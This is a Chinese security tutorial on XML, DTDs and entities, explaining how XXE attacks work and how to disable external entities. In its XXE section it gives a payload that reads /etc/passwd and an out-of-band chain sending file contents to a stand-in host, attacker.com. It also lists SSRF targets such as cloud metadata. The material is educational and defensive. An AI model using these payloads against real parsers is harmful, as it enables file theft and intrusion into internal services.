---
title: XXE漏洞核心基础：XML语法树、DTD声明与实体引用攻击原理
description: 系统梳理 XXE 漏洞利用核心基础：XML 语法树结构、DTD 声明类型、实体引用分类（内部/外部/参数实体）、PCDATA 与 CDATA
  差异，及外部实体通过 file/http 等协议实现任意文件读取的攻击原理。
category: program-analysis
tags:
- XXE
- XML
- DTD
- 实体引用
- 外部实体
- 任意文件读取
- 漏洞原理
- Web安全
date: '2023-04-16'
updated: '2026-11-14'
---

## XML 基础与树结构

### XML 定义与设计宗旨

XML（EXtensible Markup Language，可扩展标记语言）是一种标记语言，设计宗旨是**传输和存储数据**，而非显示数据。与 HTML 不同，XML 标签未被预定义，需自行定义，具有自我描述性。

**核心差异对比**：

| 特性 | XML | HTML |
|------|-----|------|
| 目的 | 传输/存储数据，关注内容 | 显示数据，关注外观 |
| 标签 | 自定义 | 预定义 |
| 语法严格性 | 必须良构（well-formed） | 宽容错误 |

### XML 文档树结构示例

```xml
<?xml version='1.0' encoding='utf-8'?>
<note>
  <to>Tove</to>
  <from>Jani</from>
  <heading>Reminder</heading>
  <body>Don't forget me this weekend!</body>
</note>
```

- **XML 声明**：`<?xml version='1.0' encoding='utf-8'?>` —— 定义版本与编码，可选但若存在必须置于首行
- **根元素**：`<note>` —— 唯一根节点，所有其他元素的父元素
- **子元素**：`<to>`、`<from>`、`<heading>`、`<body>` —— 同级元素互为同胞节点

### XML 语法规则

1. **所有元素必须有关闭标签**  
   `<to></to>` 或自闭合 `<br />`（声明非 XML 一部分，无需闭合）

2. **标签大小写敏感**  
   `<Message>` 与 `<message>` 不同

3. **必须正确嵌套**  
   `<b><i>文本</i></b>` ✓ / `<b><i>文本</b></i>` ✗

4. **属性值必须加引号**  
   `<note date="12/11/2007">` ✓ / `<note date=12/11/2007>` ✗

5. **实体引用** —— 替换特殊字符  
   XML 中 `<` 与 `&` 非法，需用预定义实体：

   | 字符 | 实体引用 |
   |------|----------|
   | `<`  | `&lt;`   |
   | `>`  | `&gt;`   |
   | `&`  | `&amp;`  |
   | `"`  | `&quot;` |
   | `'`  | `&apos;` |

6. **注释**：`<!-- 注释内容 -->`
7. **空格保留**：XML 保留所有空白字符，HTML 会合并多空格

### XML 元素与命名规则

**元素组成**：开始标签 + 内容（文本/子元素/属性/混合） + 结束标签

**命名约束**：
- 可含字母、数字、其他字符
- 不能以数字/标点/字母 `xml`（任意大小写）开头
- 不能包含空格
- 无保留字

### XML 属性使用原则

属性提供非数据核心的元数据（如文件类型）：

```xml
<file type="gif">computer.gif</file>
```

**避免滥用属性**的原因：
- 不能包含多个值（元素可）
- 不能表达树结构（元素可）
- 扩展性差

仅在需用 ID 标识元素时使用属性，其余场景首选子元素。

---

## DTD（文档类型定义）

### DTD 作用与分类

DTD 定义 XML 文档的合法构建模块，**验证通过的 XML 称为"合法" XML**；仅语法正确称为"形式良好" XML。

两种声明方式：
- **内部 DTD**：嵌入 XML 文档
- **外部 DTD**：引用 `.dtd` 文件

### 内部 DOCTYPE 声明语法

```xml
<!DOCTYPE 根元素 [元素声明]>
```

示例：

```xml
<?xml version="1.0"?>
<!DOCTYPE note [
  <!ELEMENT note (to,from,heading,body)>
  <!ELEMENT to (#PCDATA)>
  <!ELEMENT from (#PCDATA)>
  <!ELEMENT heading (#PCDATA)>
  <!ELEMENT body (#PCDATA)>
]>
<note>...</note>
```

- `<!DOCTYPE note>`：文档类型为 `note`（根元素）
- `<!ELEMENT note (to,from,heading,body)>`：`note` 包含四个子元素，顺序固定
- `<!ELEMENT to (#PCDATA)>`：`to` 类型为被解析字符数据

### 外部 DTD 引用语法

```xml
<!DOCTYPE 根元素 SYSTEM "文件名">
```

示例：

```xml
<?xml version="1.0"?>
<!DOCTYPE note SYSTEM "note.dtd">
<note>...</note>
```

`note.dtd` 内容：

```dtd
<!ELEMENT note (to,from,heading,body)>
<!ELEMENT to (#PCDATA)>
<!ELEMENT from (#PCDATA)>
<!ELEMENT heading (#PCDATA)>
<!ELEMENT body (#PCDATA)>
```

### PCDATA 与 CDATA 差异

| 特性 | PCDATA (Parsed Character Data) | CDATA (Character Data) |
|------|--------------------------------|------------------------|
| 解析行为 | 被解析器解析 | **不被解析** |
| 标签处理 | 视为标记 | 视为普通文本 |
| 实体处理 | 展开实体引用 | 不展开，原样保留 |
| 非法字符 | 不得含 `&` `<` `>` | 仅 `]]>` 结束标记受限 |
| 典型用途 | 普通文本内容 | 包含标记/代码片段的文本 |

**PCDATA 转义要求**：`&` → `&amp;`、`<` → `&lt;`、`>` → `&gt;`

---

## DTD 元素声明分类

### 声明语法通式

```dtd
<!ELEMENT 元素名 类别>
```

### 四大类别

| 类别关键字 | 含义 | 示例 |
|------------|------|------|
| `EMPTY` | 空元素 | `<!ELEMENT br EMPTY>` |
| `(#PCDATA)` | 仅含解析字符数据 | `<!ELEMENT title (#PCDATA)>` |
| `ANY` | 任意可解析数据组合 | `<!ELEMENT desc ANY>` |
| 子元素列表 | 指定子元素名、顺序、出现次数 | `<!ELEMENT note (to,from,heading,body)>` |

**子元素出现次数控制符**：

| 符号 | 含义 |
|------|------|
| 无 | 恰好一次 |
| `?` | 零次或一次 |
| `*` | 零次或多次 |
| `+` | 一次或多次 |
| `\|` | 或关系（二选一） |
| `,` | 顺序关系（必须按序） |

示例：`<!ELEMENT note (to+, from?, header*, body)>`


---

## DTD 实体声明与 XXE 攻击核心

### 实体概念

实体是定义引用普通文本或特殊字符的**变量**，分三类：
- **内部实体**（内部声明）
- **外部实体**（引用外部资源，**XXE 攻击核心**）
- **参数实体**（仅在 DTD 内部使用，以 `%` 标识）

### 内部实体声明

```dtd
<!ENTITY 实体名 "实体值">
```

引用方式：`&实体名;`

示例：

```xml
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe "内部实体内容">
]>
<foo>&xxe;</foo>
```

> **注意**：`&` 符号在 HTTP 参数传递中需 URL 编码（`%26`），否则会被视为参数分隔符。

### 外部实体声明 —— XXE 攻击向量

```dtd
<!ENTITY 实体名 SYSTEM "URI/URL">
```

**支持协议**（视解析器实现而异，通用协议如下）：

| 协议 | 用途 | 示例 |
|------|------|------|
| `file://` | 读取本地文件 | `file:///etc/passwd` |
| `http://` / `https://` | 发起 HTTP 请求、探测内网 | `http://internal/api` |
| `ftp://` | FTP 交互 | `ftp://user:pass@host/file` |
| `php://` | PHP 伪协议（过滤器/输入流） | `php://filter/read=convert.base64-encode/resource=/etc/passwd` |
| `gopher://` | 发送原始 TCP 数据包 | 攻击 Redis/FastCGI 等 |
| `dict://` / `ldap://` / `jar://` | 其他服务交互 | — |

**攻击示例**：读取 `/etc/passwd`

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <name>&xxe;</name>
</root>
```

解析后，`&xxe;` 被替换为文件内容，导致敏感信息泄露。

> 此类攻击常结合 **SSRF（服务端请求伪造）**，通过外部实体探测内网、攻击内部服务。详见 [[ssrf-bypass-techniques]]、[[ssrf-ctf-exploitation-guide]]、[[php伪协议与反序列化利用]]。

### 参数实体声明

仅在 DTD 中使用，声明与引用均带 `%`：

```dtd
<!ENTITY % 实体名 "实体值">
```

引用：`%实体名;`

**典型用途**：模块化 DTD、构造盲注 XXE 攻击链（通过外部 DTD 回带数据）。

示例：

```xml
<!DOCTYPE foo [
  <!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
  %remote;
]>
```

`evil.dtd` 内容：

```dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

此链实现**带外数据外带**（OOB XXE），绕过无回显场景。

### 公共实体声明

```dtd
<!ENTITY 实体名 PUBLIC "公共标识符" "URI">
```

较少用于攻击，主要用于标准化 DTD 引用（如 XHTML DTD）。

---

## XXE 攻击面总结与防御要点

### 攻击影响

| 攻击类型 | 影响 | 典型 Payload |
|----------|------|--------------|
| 任意文件读取 | 读取服务器本地敏感文件 | `file:///etc/passwd`、`file:///c:/windows/win.ini` |
| SSRF / 内网探测 | 访问内网服务、云元数据接口 | `http://169.254.169.254/latest/meta-data/` |
| 拒绝服务 | 实体递归展开耗尽资源（Billion Laughs） | 嵌套实体指数级膨胀 |
| 端口扫描 | 通过 HTTP/协议差异探测端口开放 | `http://internal:port` |
| RCE 链 | 结合 `php://`、`gopher://` 攻击 FastCGI/Redis | 见 [[php伪协议与反序列化利用]]、[[ssrf-ctf-exploitation-guide]] |

### 防御措施

1. **禁用外部实体解析**（核心防御）
   - Java: `DocumentBuilderFactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)` 或 `setFeature("http://xml.org/sax/features/external-general-entities", false)`
   - Python lxml: `etree.XMLParser(resolve_entities=False, no_network=True)`
   - PHP: `libxml_disable_entity_loader(true)`（旧版本）

2. **使用安全的解析器配置**（SAX/DOM/StAX 均需显式关闭外部实体）

3. **输入验证与白名单**：拒绝含 `<!DOCTYPE>`、`<!ENTITY>` 的 XML 输入

4. **最小权限原则**：解析 XML 的进程以最低权限运行，限制文件系统/网络访问

5. **监控与告警**：日志记录 XML 解析异常、大量实体展开、外部连接尝试

---

## 交叉引用与延伸阅读

- [[ssrf-bypass-techniques]] —— SSRF 绕过技巧与协议利用链（Gopher/FastCGI/Redis）
- [[ssrf-ctf-exploitation-guide]] —— CTFHUB SSRF 靶场实战利用链
- [[php伪协议与反序列化利用]] —— PHP `php://filter`、`gopher://` 等伪协议在 XXE/SSRF 中的应用
- [[mysql-dnslog-injection-loadfile-unc]] —— MySQL `load_file()` 结合 UNC 路径的 DNSLog 外带，思路与 XXE 外部实体异曲同工
- [[vulnhub-platform-resource-index]] —— VulnHub 靶场实战环境，可练习 XXE 等漏洞复现

## 来源

- [0x00实验室-202108-202304_070](../sources/0x00实验室-202108-202304_070.md)
